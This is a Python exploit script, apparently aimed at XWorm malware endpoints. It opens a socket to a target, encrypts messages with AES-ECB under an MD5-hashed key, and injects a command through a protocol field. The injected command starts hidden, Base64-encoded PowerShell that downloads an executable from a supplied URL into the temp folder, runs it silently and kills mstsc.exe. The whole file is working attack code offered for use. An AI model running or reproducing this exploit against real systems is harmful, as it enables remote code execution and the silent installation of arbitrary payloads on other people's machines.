from Crypto.Util.Padding import pad
from Crypto.Cipher import AES
import argparse
import hashlib
import socket
import base64
import random
import os

class RceExploitUtils:
    def aes_encryptor(input_bytes, key):
        key_hash = hashlib.md5(key.encode('utf-8')).digest() # MD5 hash of the key
        cipher = AES.new(key_hash, AES.MODE_ECB) # AES cipher in ECB mode
        padded = pad(input_bytes, AES.block_size) # Pad input to block size
        return cipher.encrypt(padded) # Return encrypted bytes

    def send_encrypted(sock, text: str, key: str): 
        encrypted = RceExploitUtils.aes_encryptor(text.encode(), key) # Encrypt the text
        header = (str(len(encrypted)) + "\0").encode() # Create header with length
        sock.sendall(header + encrypted) # Send header and encrypted data

class RceExploit:
    SPL_XCLIENT = "<Xwormmm>" # Separator constant, used in all XWorm Versions as far as i know

    @staticmethod
    def main():
        parser = argparse.ArgumentParser(add_help=False)
        parser.add_argument("--h", "--host", dest="host", nargs="?", help="Target host") # Target host
        parser.add_argument("--p", "--port", dest="port", nargs="?", help="Target port") # Target port
        parser.add_argument("--k", "--key", dest="key", nargs="?", help="Encryption key") # Encryption key
        parser.add_argument("--u", "--url", dest="url", nargs="?", help="Payload Direct Link") # Payload Direct Link
        parser.add_argument("--help", action="store_true", dest="help_flag", help="Show this help message and exit") # Help flag

        args, unknown = parser.parse_known_args() # Parse known args only
 
        if args.help_flag:
            parser.print_help() # Show help message
            return # Exit after showing help

        host = args.host if args.host else input("Host > ") # Get target host
        port = args.port if args.port else input("Port > ") # Get target port
        key = args.key if args.key else input("Key > ") # Get encryption key

        port = int(port) if str(port).isdigit() else input("Port > ") # Ensure port is an integer

        sock = RceExploit.connection(host, port) # Connect to target
        while True:
            url = args.url if args.url else input("Payload Direct Link > ") # Get payload direct link
            RceExploit.trigger(url, sock, key) # Trigger the Exploit


    def connection(host, port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create socket
            sock.connect((host, int(port))) # Connect to target
            print("Connected.") 
            return sock # Return the socket
        except Exception as e:
            print(f"Connection failed: {e}")
            os._exit(0) # Exit on failure

    def trigger(url, sock, key):
        try:
            payload_start = f'hrdp{RceExploit.SPL_XCLIENT}ClientID{RceExploit.SPL_XCLIENT}' 

            RceExploitUtils.send_encrypted(sock, payload_start, key) # Send encrypted message

            raw_command = (
                rf'$url = "{url}"; '
                rf'$outputPath = "$env:TEMP\{random.randint(1, 999999)}.exe"; '
                'Invoke-WebRequest -Uri $url -OutFile $outputPath; '
                'Start-Process -FilePath $outputPath -ArgumentList "/silent"; '
                'taskkill /f /IM mstsc.exe'
            ) # PowerShell command to download and execute payload
            
            encoded_command = base64.b64encode(raw_command.encode('utf-16le')).decode() # Encode command in Base64

            payload = f'hrdp+{RceExploit.SPL_XCLIENT}ClientID{RceExploit.SPL_XCLIENT}t.me/Swezy{RceExploit.SPL_XCLIENT}" & start powershell.exe -WindowStyle Hidden -EncodedCommand {encoded_command}{RceExploit.SPL_XCLIENT}0:0'

            RceExploitUtils.send_encrypted(sock, payload, key) # Send encrypted message
            print("RCE Exploit sent.")
        except Exception as e:
            print(f"Failed to send message: {e}")

if __name__ == "__main__":
    RceExploit.main() # Run the main function